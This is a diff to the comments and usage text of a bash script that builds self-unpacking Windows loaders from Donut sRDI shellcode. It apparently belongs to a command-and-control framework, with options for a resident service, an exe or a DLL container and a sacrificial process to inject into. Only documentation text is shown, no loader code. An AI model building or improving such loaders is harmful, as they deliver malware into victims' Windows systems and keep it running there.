@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # Build a self-unpacking Windows loader from a Donut sRDI shellcode blob.
 #
-# Runs on the C2 as a local module ("staged_loader"). Requires:
+# Runs on the C2 as a local module ("loader_windows"). Requires:
 #   * a MinGW-w64 cross compiler matching --arch
 #     (Linux: apt install gcc-mingw-w64-x86-64 / gcc-mingw-w64-i686,
 #      Windows/msys2: mingw-w64-x86_64-gcc / mingw-w64-i686-gcc)
@@ -49,7 +49,8 @@ options:
                        for service, <name>.exe for exe, <name>.dll for dll)
   --format <service|exe|dll>
                        host container to build (default: service)
-                         service = one-shot Windows service executable
+                         service = resident Windows service (injects once,
+                                   reports RUNNING and stays up until stopped)
                          exe     = plain console executable
                          dll     = DLL exporting Run()
   --process <name>     sacrificial process: bare name (System32) or full path
